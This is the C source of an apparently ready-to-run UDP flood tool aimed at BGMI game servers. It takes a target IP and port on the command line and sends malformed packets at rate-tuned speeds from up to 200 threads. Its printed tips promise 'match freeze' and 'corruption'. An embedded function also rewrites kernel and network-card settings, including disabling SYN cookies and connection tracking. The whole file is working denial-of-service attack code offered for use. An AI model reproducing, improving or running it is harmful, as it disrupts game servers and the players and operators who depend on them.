#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>
#include <signal.h>

#define FLOOD_SOCKETS 384
#define MIN_TIME 10
#define MAX_TIME 300
#define MIN_PACKET_SIZE 24
#define MAX_PACKET_SIZE 72
#define MIN_THREADS 100
#define MAX_THREADS 200
#define PORT_RANGE 20000
#define MIN_SRC_PORT 15000
#define MAX_SRC_PORT 35000
#define BATCH_UPDATE 10000
#define WARMUP_SECONDS 8
#define SOCKET_SNDBUF 33554432
#define SOCKET_RCVBUF 16777216
#define MAX_TOTAL_THREADS 500
#define BGMI_MAGIC_HEADER 0x4752414D
#define PACKET_HEADER_SIZE 12
#define MAX_BURST_PACKETS 500
#define ATTACK_START_DELAY 10000
#define STATS_UPDATE_INTERVAL 1
#define RECONNECT_RETRIES 3
#define CORRUPTION_INTERVAL 8
#define TARGET_PPS_PER_THREAD 250
#define MAX_PPS_PER_THREAD 500
#define TRANSITION_DURATION_MS 2000

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int should_attack = 0;
_Atomic int warmup_complete = 0;
_Atomic int attack_seconds = 0;
_Atomic int total_elapsed = 0;
_Atomic int global_phase = 0;

struct sockaddr_in target_addr;

void signal_handler(int sig) {
    atomic_store(&stop_signal, 1);
}

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=10000000 >/dev/null 2>&1");
    system("sysctl -w net.core.optmem_max=33554432 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=1048576 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget=5000 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget_usecs=60000 >/dev/null 2>&1");
    system("sysctl -w net.core.dev_weight=5000 >/dev/null 2>&1");
    
    system("sysctl -w net.ipv4.udp_mem='25165824 50331648 100663296' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=131072 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=131072 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1");
    
    system("sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_ecn=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null 2>&1");
    
    system("sysctl -w net.netfilter.nf_conntrack_max=0 >/dev/null 2>&1 2>/dev/null");
    
    system("sysctl -w vm.swappiness=0 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_ratio=90 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_background_ratio=70 >/dev/null 2>&1");
    system("sysctl -w vm.overcommit_memory=1 >/dev/null 2>&1");
    system("sysctl -w vm.min_free_kbytes=131072 >/dev/null 2>&1");
    
    system("sysctl -w net.core.busy_poll=50 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_read=50 >/dev/null 2>&1");
    
    system("sysctl -w kernel.sched_min_granularity_ns=100000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_wakeup_granularity_ns=50000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_migration_cost_ns=0 >/dev/null 2>&1");
    
    system("for iface in $(ip -o link show | awk -F': ' '{print $2}' 2>/dev/null); do "
           "ethtool -K $iface tx off rx off sg off tso off gso off gro off lro off 2>/dev/null; "
           "ethtool -G $iface rx 8192 tx 8192 2>/dev/null; "
           "ethtool -C $iface rx-usecs 0 rx-frames 0 tx-usecs 0 tx-frames 0 2>/dev/null; "
           "done 2>/dev/null");
    
    system("echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null");
    
    system("for irq in $(grep 'eth\\|enp\\|ens' /proc/interrupts | awk '{print $1}' | tr -d : 2>/dev/null); do "
           "echo 1 > /proc/irq/$irq/smp_affinity 2>/dev/null; "
           "done 2>/dev/null");
    
    system("ulimit -n 1048576 >/dev/null 2>&1");
    system("ulimit -u unlimited >/dev/null 2>&1");
#endif
}

int set_sock_buf(int sock) {
    int sndbuf = SOCKET_SNDBUF;
    int rcvbuf = SOCKET_RCVBUF;
    int opt = 1;
    
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
        return -1;
    }
    if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
        return -1;
    }
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    return 0;
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int phase) {
    int actual_size = size;
    if (actual_size < MIN_PACKET_SIZE) actual_size = MIN_PACKET_SIZE;
    if (actual_size > MAX_PACKET_SIZE) actual_size = MAX_PACKET_SIZE;
    
    if (phase == 0) {
        memset(buf, 0xFF, actual_size);
        
        if ((fast_rand(seed) % 3) == 0) {
            buf[0] = 0x52;
            buf[1] = 0x53;
            buf[2] = 0x54;
            buf[3] = 0xFF;
            uint32_t *header = (uint32_t*)(buf + 4);
            header[0] = 0xFFFFFFFF;
            header[1] = 0x00000000;
        } else {
            buf[0] = 0x48;
            buf[1] = 0x4F;
            buf[2] = 0x4C;
            buf[3] = 0x44;
            uint32_t *header = (uint32_t*)(buf + 4);
            header[0] = 0xDEADBEEF;
            header[1] = (unsigned int)time(NULL);
        }
        
        for (int i = 12; i < actual_size; i++) {
            if (i % 8 == 0) buf[i] = 0xFF;
            else buf[i] = (fast_rand(seed) ^ i ^ thread_id) & 0xFF;
        }
        return;
    }
    
    if (phase == 1) {
        if ((fast_rand(seed) % 4) == 0) {
            memset(buf, 0xFF, actual_size);
            uint32_t *header = (unsigned int*)buf;
            header[0] = 0xDEADBEEF ^ thread_id;
            header[1] = (unsigned int)time(NULL) ^ *seed;
            
            for (int i = 8; i < actual_size; i++) {
                if (i % 7 == 0) buf[i] = 0xFF;
                else if (i % 5 == 0) buf[i] = 0x00;
                else buf[i] = (fast_rand(seed) + i) & 0xFF;
            }
        } else {
            memset(buf, 0, actual_size);
            unsigned int *header = (unsigned int*)buf;
            header[0] = 0xDEADBEEF ^ thread_id ^ seq ^ (time(NULL) & 0xFFFF);
            header[1] = (unsigned int)time(NULL) ^ *seed ^ (getpid() << 16);
            
            if (actual_size > 20) {
                header[2] = BGMI_MAGIC_HEADER;
                for (int i = 12; i < actual_size; i++) {
                    buf[i] = (fast_rand(seed) ^ i ^ thread_id) & 0xFF;
                }
            }
        }
        return;
    }
    
    if ((fast_rand(seed) % 25) == 0) {
        memset(buf, 0xFF, actual_size);
        uint32_t *header = (unsigned int*)buf;
        header[0] = 0xFFFFFFFF;
        header[1] = 0xFFFFFFFF;
        return;
    }
    
    memset(buf, 0, actual_size);
    
    unsigned int *header = (unsigned int*)buf;
    header[0] = 0xDEADBEEF ^ thread_id ^ seq ^ (time(NULL) & 0xFFFF);
    header[1] = (unsigned int)time(NULL) ^ *seed ^ (getpid() << 16);
    
    if (actual_size > PACKET_HEADER_SIZE) {
        if (actual_size <= 40) {
            for (int i = PACKET_HEADER_SIZE; i < actual_size; i++) {
                buf[i] = (fast_rand(seed) + i + thread_id) & 0xFF;
                if (fast_rand(seed) % 4 == 0) buf[i] = 0x00;
            }
        } 
        else if (actual_size <= 60) {
            header[2] = BGMI_MAGIC_HEADER;
            for (int i = PACKET_HEADER_SIZE; i < actual_size; i++) {
                if (i == 20 || i == 24 || i == 28) buf[i] = 0xFF;
                else buf[i] = fast_rand(seed) & 0xFF;
            }
        }
        else {
            header[2] = BGMI_MAGIC_HEADER;
            if (actual_size > 16) {
                header[3] = 0x00070000;
            }
            for (int i = PACKET_HEADER_SIZE; i < actual_size; i++) {
                if (i % CORRUPTION_INTERVAL == 0) buf[i] = 0xFF;
                else buf[i] = (fast_rand(seed) ^ i) & 0xFF;
            }
        }
    }
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[FLOOD_SOCKETS];
    char *packets[FLOOD_SOCKETS];
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    
    int active_sockets = 0;
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        
        if (set_sock_buf(socks[i]) < 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(MIN_SRC_PORT + ((thread_idx * 17 + i) % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        packets[i] = malloc(MAX_PACKET_SIZE);
        if (!packets[i]) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        active_sockets++;
    }
    
    if (active_sockets == 0) return NULL;
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_counter = thread_idx * 100000;
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_idx * 1234567) ^ getpid() ^ ts.tv_usec ^ (ts.tv_sec << 16);
    
    struct sockaddr_in warmup_addr;
    memset(&warmup_addr, 0, sizeof(warmup_addr));
    warmup_addr.sin_family = AF_INET;
    warmup_addr.sin_port = htons(9);
    warmup_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0 && packets[i]) {
            create_bgmi_packet(packets[i], MAX_PACKET_SIZE, thread_idx + 1000, 0, &seed, 0);
            sendto(socks[i], packets[i], MAX_PACKET_SIZE, MSG_DONTWAIT,
                  (struct sockaddr*)&warmup_addr, sizeof(warmup_addr));
        }
    }
    
    while (!atomic_load(&should_attack) && !atomic_load(&stop_signal)) {
        usleep(1000 + (thread_idx % 100));
    }
    
    struct timeval start_time, current_time, last_stats_time;
    gettimeofday(&start_time, NULL);
    gettimeofday(&last_stats_time, NULL);
    
    long long packets_sent_this_second = 0;
    long target_packets_per_second = TARGET_PPS_PER_THREAD;
    long max_packets_per_second = MAX_PPS_PER_THREAD;
    
    int current_packet_size = MAX_PACKET_SIZE;
    int resized = 0;
    
    int consecutive_eagain = 0;
    int send_success = 0;
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000 + (thread_idx % 100));
            continue;
        }
        
        gettimeofday(&current_time, NULL);
        
        long elapsed_us = (current_time.tv_sec - start_time.tv_sec) * 1000000L;
        if (current_time.tv_usec < start_time.tv_usec) {
            elapsed_us -= 1000000;
            elapsed_us += (current_time.tv_usec + 1000000 - start_time.tv_usec);
        } else {
            elapsed_us += (current_time.tv_usec - start_time.tv_usec);
        }
        long elapsed_ms = (elapsed_us + 500) / 1000;
        
        int phase = atomic_load(&global_phase);
        if (phase >= 1 && !resized) {
            for (int i = 0; i < FLOOD_SOCKETS; i++) {
                if (packets[i]) {
                    free(packets[i]);
                    packets[i] = malloc(PACKET_SIZE);
                    if (!packets[i]) {
                        close(socks[i]);
                        socks[i] = -1;
                        active_sockets--;
                    }
                }
            }
            resized = 1;
            current_packet_size = PACKET_SIZE;
        }
        
        current_packet_size = (phase == 0) ? MAX_PACKET_SIZE : PACKET_SIZE;
        
        long long time_since_last_stats = (current_time.tv_sec - last_stats_time.tv_sec) * 1000000L;
        if (current_time.tv_usec < last_stats_time.tv_usec) {
            time_since_last_stats -= 1000000;
            time_since_last_stats += (current_time.tv_usec + 1000000 - last_stats_time.tv_usec);
        } else {
            time_since_last_stats += (current_time.tv_usec - last_stats_time.tv_usec);
        }
        
        if (time_since_last_stats >= 1000000) {
            if (packets_sent_this_second >= target_packets_per_second * 9 / 10 && consecutive_eagain == 0) {
                if (target_packets_per_second < max_packets_per_second) {
                    target_packets_per_second = target_packets_per_second * 11 / 10;
                    if (target_packets_per_second > max_packets_per_second)
                        target_packets_per_second = max_packets_per_second;
                }
            }
            packets_sent_this_second = 0;
            gettimeofday(&last_stats_time, NULL);
        }
        
        long packets_per_100ms = target_packets_per_second / 10;
        if (packets_per_100ms < 1) packets_per_100ms = 1;
        if (packets_per_100ms > 50) packets_per_100ms = 50;
        
        int eagain_count = 0;
        for (int p = 0; p < packets_per_100ms && packets_sent_this_second < max_packets_per_second; p++) {
            int socket_index = p % active_sockets;
            if (socket_index < 0 || socket_index >= FLOOD_SOCKETS) socket_index = 0;
            if (socks[socket_index] < 0 || !packets[socket_index]) continue;
            
            create_bgmi_packet(packets[socket_index], current_packet_size, 
                              thread_idx + 1000, seq_counter, &seed, phase);
            
            int ret = sendto(socks[socket_index], packets[socket_index], 
                            current_packet_size, MSG_DONTWAIT,
                            (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (ret == current_packet_size) {
                local_packets++;
                local_bytes += current_packet_size;
                seq_counter++;
                packets_sent_this_second++;
                send_success++;
                consecutive_eagain = 0;
            } else if (ret < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                eagain_count++;
                consecutive_eagain++;
                if (consecutive_eagain > 20) {
                    target_packets_per_second = target_packets_per_second * 9 / 10;
                    if (target_packets_per_second < 50) target_packets_per_second = 50;
                    consecutive_eagain = 0;
                }
            } else if (ret < 0) {
                close(socks[socket_index]);
                socks[socket_index] = -1;
                free(packets[socket_index]);
                packets[socket_index] = NULL;
                active_sockets--;
            }
        }
        
        if (active_sockets == 0) break;
        
        if (send_success > 1000) {
            send_success = 0;
            if (consecutive_eagain == 0 && target_packets_per_second < max_packets_per_second) {
                target_packets_per_second = target_packets_per_second * 101 / 100;
            }
        }
        
        long sleep_time_us = 100000 - (packets_per_100ms * 20);
        if (sleep_time_us < 1000) sleep_time_us = 1000;
        if (sleep_time_us > 50000) sleep_time_us = 50000;
        
        usleep(sleep_time_us + (thread_idx % 100));
        
        if (local_packets >= BATCH_UPDATE) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i]) free(packets[i]);
    }
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cores <= 0) num_cores = 1;
    int core = tid % num_cores;
    if (core < num_cores && core < CPU_SETSIZE) {
        CPU_SET(core, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
    
    usleep((tid % 20) * 1000);
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    if (set_sock_buf(s) < 0) {
        close(s);
        return NULL;
    }
    
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + ((tid * 19) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    
    char warmup_packet[MAX_PACKET_SIZE];
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_local = tid * 77777;
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (tid * 7654321) ^ getpid() ^ ts.tv_usec ^ (ts.tv_sec << 16);
    
    struct sockaddr_in warmup_addr;
    memset(&warmup_addr, 0, sizeof(warmup_addr));
    warmup_addr.sin_family = AF_INET;
    warmup_addr.sin_port = htons(9);
    warmup_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    
    create_bgmi_packet(warmup_packet, MAX_PACKET_SIZE, tid, 0, &seed, 0);
    sendto(s, warmup_packet, MAX_PACKET_SIZE, MSG_DONTWAIT,
           (struct sockaddr *)&warmup_addr, sizeof(warmup_addr));
    
    while (!atomic_load(&should_attack) && !atomic_load(&stop_signal)) {
        usleep(1000 + (tid % 100));
    }
    
    struct timeval thread_start_time, thread_current_time, thread_last_stats;
    gettimeofday(&thread_start_time, NULL);
    gettimeofday(&thread_last_stats, NULL);
    
    long long thread_packets_sent = 0;
    long thread_target_pps = TARGET_PPS_PER_THREAD;
    long thread_max_pps = MAX_PPS_PER_THREAD;
    
    int thread_resized = 0;
    int thread_consecutive_eagain = 0;
    int thread_send_success = 0;
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000 + (tid % 100));
            continue;
        }
        
        int phase = atomic_load(&global_phase);
        int current_size = (phase == 0) ? MAX_PACKET_SIZE : PACKET_SIZE;
        
        if (phase >= 1 && !thread_resized) {
            char* new_packet = malloc(PACKET_SIZE);
            if (!new_packet) {
                free(packet);
                close(s);
                return NULL;
            }
            free(packet);
            packet = new_packet;
            thread_resized = 1;
        }
        
        gettimeofday(&thread_current_time, NULL);
        
        long long thread_time_since_stats = (thread_current_time.tv_sec - thread_last_stats.tv_sec) * 1000000L;
        if (thread_current_time.tv_usec < thread_last_stats.tv_usec) {
            thread_time_since_stats -= 1000000;
            thread_time_since_stats += (thread_current_time.tv_usec + 1000000 - thread_last_stats.tv_usec);
        } else {
            thread_time_since_stats += (thread_current_time.tv_usec - thread_last_stats.tv_usec);
        }
        
        if (thread_time_since_stats >= 1000000) {
            if (thread_packets_sent >= thread_target_pps * 9 / 10 && thread_consecutive_eagain == 0) {
                if (thread_target_pps < thread_max_pps) {
                    thread_target_pps = thread_target_pps * 11 / 10;
                    if (thread_target_pps > thread_max_pps)
                        thread_target_pps = thread_max_pps;
                }
            }
            thread_packets_sent = 0;
            gettimeofday(&thread_last_stats, NULL);
        }
        
        int thread_packets_to_send = thread_target_pps / 20;
        if (thread_packets_to_send < 1) thread_packets_to_send = 1;
        if (thread_packets_to_send > 25) thread_packets_to_send = 25;
        
        int thread_eagain = 0;
        for (int p = 0; p < thread_packets_to_send && thread_packets_sent < thread_max_pps; p++) {
            char *send_packet = (phase == 0) ? warmup_packet : packet;
            
            if (phase == 0) {
                create_bgmi_packet(warmup_packet, current_size, tid, seq_local, &seed, phase);
            } else {
                create_bgmi_packet(packet, current_size, tid, seq_local, &seed, phase);
            }
            
            int ret = sendto(s, send_packet, current_size, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            if (ret == current_size) {
                local_packets++;
                local_bytes += current_size;
                seq_local++;
                thread_packets_sent++;
                thread_send_success++;
                thread_consecutive_eagain = 0;
            } else if (ret < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                thread_eagain++;
                thread_consecutive_eagain++;
                if (thread_consecutive_eagain > 10) {
                    thread_target_pps = thread_target_pps * 9 / 10;
                    if (thread_target_pps < 50) thread_target_pps = 50;
                    thread_consecutive_eagain = 0;
                }
            } else if (ret < 0) {
                break;
            }
        }
        
        if (thread_send_success > 500) {
            thread_send_success = 0;
            if (thread_consecutive_eagain == 0 && thread_target_pps < thread_max_pps) {
                thread_target_pps = thread_target_pps * 101 / 100;
            }
        }
        
        if (local_packets >= 5000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        long thread_sleep_us = 50000 - (thread_packets_to_send * 20);
        if (thread_sleep_us < 1000) thread_sleep_us = 1000;
        if (thread_sleep_us > 30000) thread_sleep_us = 30000;
        
        usleep(thread_sleep_us + (tid % 50));
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    free(packet);
    close(s);
    return NULL;
}

void *phase_controller(void *arg) {
    printf("⚡ Warm-up: %d seconds...\n", WARMUP_SECONDS);
    
    atomic_store(&should_attack, 1);
    
    sleep(WARMUP_SECONDS);
    
    if (!atomic_load(&stop_signal)) {
        atomic_store(&global_phase, 1);
        printf("🔄 Transition phase...\n");
        usleep(TRANSITION_DURATION_MS * 1000);
        atomic_store(&global_phase, 2);
        atomic_store(&warmup_complete, 1);
        printf("✅ Warm-up complete\n");
        printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    }
    
    return NULL;
}

void *attack_timer(void *arg) {
    int total_time = WARMUP_SECONDS + ATTACK_TIME + (TRANSITION_DURATION_MS / 1000) + 1;
    
    for (int sec = 0; sec < total_time && !atomic_load(&stop_signal); sec++) {
        sleep(1);
        atomic_fetch_add(&total_elapsed, 1);
        
        if (sec >= WARMUP_SECONDS + (TRANSITION_DURATION_MS / 1000)) {
            atomic_fetch_add(&attack_seconds, 1);
        }
    }
    
    atomic_store(&stop_signal, 1);
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    
    while (!atomic_load(&stop_signal)) {
        sleep(STATS_UPDATE_INTERVAL);
        
        unsigned long long snap_packets = atomic_load(&total_packets);
        unsigned long long snap_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = (snap_packets - prev_packets) / STATS_UPDATE_INTERVAL;
        
        if (atomic_load(&should_attack)) {
            unsigned long long bytes_diff = snap_bytes - prev_bytes;
            double megabytes = bytes_diff / (1024.0 * 1024.0);
            
            atomic_store(&current_pps, pps);
            
            if (pps > atomic_load(&peak_pps)) {
                atomic_store(&peak_pps, pps);
            }
            
            if (!atomic_load(&warmup_complete)) {
                printf("💥 Breaking: %lluK PPS | %lluK Peak | %.1fMB\n", 
                       pps/1000, atomic_load(&peak_pps)/1000, megabytes);
            } else {
                printf("🔥 PPS: %lluK | Peak: %lluK | %.1fMB\n", 
                       pps/1000, atomic_load(&peak_pps)/1000, megabytes);
            }
        }
        
        prev_packets = snap_packets;
        prev_bytes = snap_bytes;
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port: %s\n", argv[2]);
        return 1;
    }
    
    if (ATTACK_TIME < MIN_TIME) ATTACK_TIME = MIN_TIME;
    if (ATTACK_TIME > MAX_TIME) ATTACK_TIME = MAX_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
#ifdef __linux__
    long max_threads = sysconf(_SC_THREAD_THREADS_MAX);
    if (max_threads > 0 && THREAD_COUNT > max_threads - 50) {
        THREAD_COUNT = max_threads - 50;
    }
    if (THREAD_COUNT > MAX_TOTAL_THREADS) {
        THREAD_COUNT = MAX_TOTAL_THREADS;
    }
#endif
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    
    printf("\n========== 🚀 MR.X NEVER END 🚀 ==========\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏱️  Time: %d seconds (10-300)\n", ATTACK_TIME);
    printf("📦 Packet Size: %d bytes (24-72)\n", PACKET_SIZE);
    printf("🧵 Threads: %d (100-200)\n", THREAD_COUNT);
    printf("===============================================\n");
    
    if (PACKET_SIZE < 40) {
        printf("💡 Tip: Use 40-48 bytes for maximum packets\n");
    } else if (PACKET_SIZE < 56) {
        printf("💡 Tip: Good balance for freeze + notice\n");
    } else if (PACKET_SIZE >= 64) {
        printf("💡 Tip: Perfect corruption for match freeze\n");
    }
    printf("\n");
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    optimize_kernel();
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_signal, 0);
    atomic_store(&should_attack, 0);
    atomic_store(&warmup_complete, 0);
    atomic_store(&attack_seconds, 0);
    atomic_store(&total_elapsed, 0);
    atomic_store(&global_phase, 0);
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    if (pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id) != 0) {
        printf("Failed to create direct attack thread\n");
        return 1;
    }
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        free(threads);
        free(tids);
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = -1;
    }
    
    printf("🚀 Creating %d attack threads...\n", THREAD_COUNT);
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) != 0) {
            printf("Failed to create thread %d\n", i);
            tids[i] = -1;
        }
        usleep(500);
    }
    
    pthread_t phase_thread;
    pthread_create(&phase_thread, NULL, phase_controller, NULL);
    
    pthread_t timer_thread;
    pthread_create(&timer_thread, NULL, attack_timer, NULL);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(direct_thread, NULL);
    pthread_join(monitor_thread, NULL);
    pthread_join(phase_thread, NULL);
    pthread_join(timer_thread, NULL);
    
    int elapsed = atomic_load(&attack_seconds);
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (elapsed > 0) {
        double avg_pps = total_p / (double)elapsed;
        double total_gb = total_b / (1024.0 * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
    } else if (atomic_load(&total_elapsed) > 0) {
        printf("\n⚠️  Attack stopped before completion\n");
    }
    
    free(threads);
    free(tids);
    
    printf("\n✅ Cleanup complete\n");
    
    return 0;
}